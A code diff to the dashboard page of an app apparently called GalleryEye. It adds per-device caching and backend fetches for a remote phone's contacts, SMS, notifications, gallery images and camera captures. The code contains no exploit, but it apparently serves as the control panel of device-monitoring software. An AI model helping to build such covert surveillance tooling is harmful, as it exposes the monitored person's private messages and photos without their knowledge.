@@ -78,6 +78,7 @@ export default function Home() {
     // Multi-Device State
     const [devices, setDevices] = useState<any[]>([]);
     const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
+    const selectedDeviceIdRef = useRef<string | null>(null);
     const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
 
     // Initialize state from localStorage after mount to avoid hydration mismatch
@@ -95,8 +96,9 @@ export default function Home() {
         }
     }, []);
 
-    // Persist selected device to localStorage
+    // Persist selected device to localStorage and keep ref in sync
     useEffect(() => {
+        selectedDeviceIdRef.current = selectedDeviceId;
         if (selectedDeviceId) {
             localStorage.setItem('selectedDeviceId', selectedDeviceId);
         } else {
@@ -106,17 +108,69 @@ export default function Home() {
 
     useEffect(() => {
         if (selectedDeviceId && typeof window !== 'undefined') {
-            setImages([]);
-            setFolders([]);
-            setCapturedMedia([]);
+            const uuid = (session?.user as any)?.uuid;
+            try {
+                const cachedContacts = localStorage.getItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`);
+                if (cachedContacts) setContactsList(JSON.parse(cachedContacts));
+                else setContactsList([]);
+
+                const cachedSms = localStorage.getItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`);
+                if (cachedSms) setSmsList(JSON.parse(cachedSms));
+                else setSmsList([]);
+
+                const cachedNotifs = localStorage.getItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`);
+                if (cachedNotifs) setNotifications(JSON.parse(cachedNotifs));
+
+                const cachedImages = localStorage.getItem(`gallery_images_${uuid}_${selectedDeviceId}`);
+                if (cachedImages) setImages(JSON.parse(cachedImages));
+                else setImages([]);
+
+                const cachedCaptured = localStorage.getItem(`gallery_captured_${uuid}_${selectedDeviceId}`);
+                if (cachedCaptured) setCapturedMedia(JSON.parse(cachedCaptured));
+                else setCapturedMedia([]);
+            } catch {
+                setImages([]);
+                setFolders([]);
+                setCapturedMedia([]);
+            }
+
             if ((window as any).fetchGalleryData) {
                 (window as any).fetchGalleryData(1, false, false, selectedDeviceId);
             }
             if ((window as any).fetchCameraData) {
                 (window as any).fetchCameraData(1, selectedDeviceId);
             }
+
+            if (uuid) {
+                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${selectedDeviceId}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.contacts && Array.isArray(data.contacts)) {
+                            setContactsList(data.contacts);
+                            try { localStorage.setItem(`galleryeye_contacts_${uuid}_${selectedDeviceId}`, JSON.stringify(data.contacts)); } catch {}
+                        }
+                    }).catch(() => {});
+
+                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${selectedDeviceId}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.sms && Array.isArray(data.sms)) {
+                            setSmsList(data.sms);
+                            try { localStorage.setItem(`galleryeye_sms_${uuid}_${selectedDeviceId}`, JSON.stringify(data.sms)); } catch {}
+                        }
+                    }).catch(() => {});
+
+                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}?deviceId=${selectedDeviceId}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.notifications && Array.isArray(data.notifications)) {
+                            setNotifications(data.notifications);
+                            try { localStorage.setItem(`galleryeye_notifications_${uuid}_${selectedDeviceId}`, JSON.stringify(data.notifications)); } catch {}
+                        }
+                    }).catch(() => {});
+            }
         }
-    }, [selectedDeviceId]);
+    }, [selectedDeviceId, session]);
 
     const [uploadProgress, setUploadProgress] = useState<any>(null);
     const [showAppModal, setShowAppModal] = useState(false);
@@ -546,15 +600,27 @@ export default function Home() {
             // SMS Event Listeners
             socket.on("sms_list", (data: any) => {
                 setIsFetchingSms(false);
+                const devId = data.deviceId || selectedDeviceIdRef.current;
+                const uuid = session?.user?.uuid;
                 if (data.isIncremental && data.sms?.length > 0) {
-                    // Merge new SMS with existing, avoiding duplicates
                     setSmsList((prev) => {
                         const existingIds = new Set(prev.map(s => s.id));
                         const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
-                        return [...newSms, ...prev];
+                        const updated = [...newSms, ...prev];
+                        try {
+                            if (devId && uuid) {
+                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(updated));
+                            }
+                        } catch {}
+                        return updated;
                     });
                 } else if (data.sms) {
                     setSmsList(data.sms);
+                    try {
+                        if (devId && uuid) {
+                            localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(data.sms));
+                        }
+                    } catch {}
                 }
             });
 
@@ -573,6 +639,13 @@ export default function Home() {
                 setIsFetchingContacts(false);
                 if (data.contacts) {
                     setContactsList(data.contacts);
+                    try {
+                        const devId = data.deviceId || selectedDeviceIdRef.current;
+                        const uuid = session?.user?.uuid;
+                        if (devId && uuid) {
+                            localStorage.setItem(`galleryeye_contacts_${uuid}_${devId}`, JSON.stringify(data.contacts));
+                        }
+                    } catch {}
                 }
             });
 
@@ -590,18 +663,26 @@ export default function Home() {
             socket.on("new_notification", (data: any) => {
                 setNotifications(prev => {
                     const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
-                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
+                    try { 
+                        localStorage.setItem('galleryeye_notifications', JSON.stringify(updated));
+                        const devId = data.deviceId || selectedDeviceIdRef.current;
+                        const uuid = session?.user?.uuid;
+                        if (devId && uuid) {
+                            localStorage.setItem(`galleryeye_notifications_${uuid}_${devId}`, JSON.stringify(updated));
+                        }
+                    } catch { }
                     return updated;
                 });
                 // Request icon if not already cached - emit OUTSIDE setState
-                if (data.packageName && session?.user?.uuid && selectedDeviceId) {
+                const currentDevId = selectedDeviceIdRef.current || selectedDeviceId;
+                if (data.packageName && session?.user?.uuid && currentDevId) {
                     setAppIcons(prev => {
                         if (!prev[data.packageName]) {
                             // Use setTimeout to ensure emit is outside React render cycle
                             setTimeout(() => {
                                 socket.emit('request_app_icon', {
                                     uuid: (session.user as any).uuid,
-                                    targetDeviceId: selectedDeviceId,
+                                    targetDeviceId: currentDevId,
                                     packageName: data.packageName
                                 });
                             }, 0);
@@ -947,7 +1028,8 @@ export default function Home() {
             });
 
             // Load cached images instantly for fast UX
-            const GALLERY_CACHE_KEY = `gallery_images_${uuid}`;
+            const initDeviceId = localStorage.getItem('selectedDeviceId');
+            const GALLERY_CACHE_KEY = initDeviceId ? `gallery_images_${uuid}_${initDeviceId}` : `gallery_images_${uuid}`;
             try {
                 const cachedImages = localStorage.getItem(GALLERY_CACHE_KEY);
                 if (cachedImages) {
@@ -987,7 +1069,8 @@ export default function Home() {
                         setGalleryHasMore(hasMore);
                         setGalleryPage(loadPage);
 
-                        try { localStorage.setItem(GALLERY_CACHE_KEY, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }
+                        const cacheKey = targetDeviceId ? `gallery_images_${uuid}_${targetDeviceId}` : `gallery_images_${uuid}`;
+                        try { localStorage.setItem(cacheKey, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }
                     })
                     .catch(e => console.error('[Gallery] Fetch error:', e))
                     .finally(() => { isFetchingGallery = false; setIsLoadingMore(false); });
@@ -1013,6 +1096,8 @@ export default function Home() {
                         }));
 
                         setCapturedMedia(captures);
+                        const camCacheKey = targetDeviceId ? `gallery_captured_${uuid}_${targetDeviceId}` : `gallery_captured_${uuid}`;
+                        try { localStorage.setItem(camCacheKey, JSON.stringify(captures.slice(0, 100))); } catch { /* storage full */ }
                     })
                     .catch(e => console.error('[Camera] Fetch error:', e))
                     .finally(() => { isFetchingCamera = false; });
